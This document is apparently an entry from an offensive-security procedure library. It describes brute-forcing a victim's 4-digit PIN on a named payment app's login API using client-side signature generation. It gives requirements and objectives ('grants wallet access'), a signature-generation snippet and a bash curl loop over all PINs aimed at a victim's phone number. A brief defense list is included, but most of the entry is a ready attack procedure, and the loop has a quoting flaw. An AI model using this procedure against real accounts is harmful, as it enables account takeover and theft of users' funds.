---
id: proc-romit-bruteforce-pin-001
name: Brute-Force-PIN-Using-Client-Side-Signature-Generation
type: procedure
verified: false
submitted: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:56.213Z'
tactics:
  - '[[Initial Access]]'
techniques:
  - '[[Brute Force]]'
sub_techniques:
  - '[[Password Spraying]]'
tags:
  - brute-force
  - pin-guessing
  - signature-generation
platforms:
  - Web
tools:
  - '[[tools/calSignature-js]]'
  - '[[tools/Burp-Suite]]'
commands:
  - '[[commands/curl-pin-bruteforce]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Brute Force]]'
---

# Brute-Force-PIN-Using-Client-Side-Signature-Generation

## Summary

This procedure brute-forces the victim's 4-digit PIN by generating client-side authorization signatures using API credentials and sending unlimited requests to the /v0/cash/auth/login endpoint, exploiting the lack of rate limiting.

## Description

The Romit app allows client-side signature generation with apiKey, apiSecret, and Location-ID, enabling automated guessing of PINs (0000-9999) without server-side protections. Targeted at the web API, this step requires prior trigger and tools like calSignature.js for signing and Burp for automation. Outcome: Successful PIN guess grants wallet access.

## Requirements

1. API credentials (apiKey, apiSecret, Location-ID)
2. Victim phone number and active verification session
3. [[tools/calSignature-js]] script and [[tools/Burp-Suite]] for request automation

## Defense

Defensive measures and detection strategies:

- Implement exponential backoff or hard rate limiting (e.g., 5 attempts per minute) on PIN verification
- Use server-side signature validation with time-bound nonces
- Monitor for high-volume login attempts from single IP/session

## Objectives

1. Guess correct 4-digit PIN via brute-force
2. Bypass authentication without SMS/GA
3. Achieve valid session for data access

## Instructions

### Step 1: Generate Signatures

**Context**: Use calSignature.js to create auth headers for each PIN guess.

Load the script in a Node.js environment or browser console and generate token:

```javascript
// Example from calSignature.js
const signature = calculateSignature(apiKey, apiSecret, locationId, pinGuess, timestamp);
```

> Produces Bearer token for headers.

### Step 2: Automate Brute-Force Requests

**Context**: Send signed requests with varying PINs using Burp Intruder or curl loop.

Execute [[commands/curl-pin-bruteforce]] for testing:

```bash
for pin in {0000..9999}; do
  curl -X POST https://api.romit.io/v0/cash/auth/login \
    -H "Authorization: Bearer $(node calSignature.js $pin)" \
    -d '{"phone":"+1VICTIM_PHONE","pin":"$pin"}' | grep -q "success" && echo "PIN: $pin" && break

done
```

> Expected output: On success, {"status":"authenticated"} or similar; stops on match.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Brute Force]] Brute Force

### Sub-Techniques

- [[Password Spraying]] Password Spraying (adapted for PIN)

## Commands Used

- [[commands/curl-pin-bruteforce]]

## Tools Used

- [[tools/calSignature-js]]
- [[tools/Burp-Suite]]

## Tags

- [[brute-force]]
- [[pin-guessing]]
- [[signature-generation]]
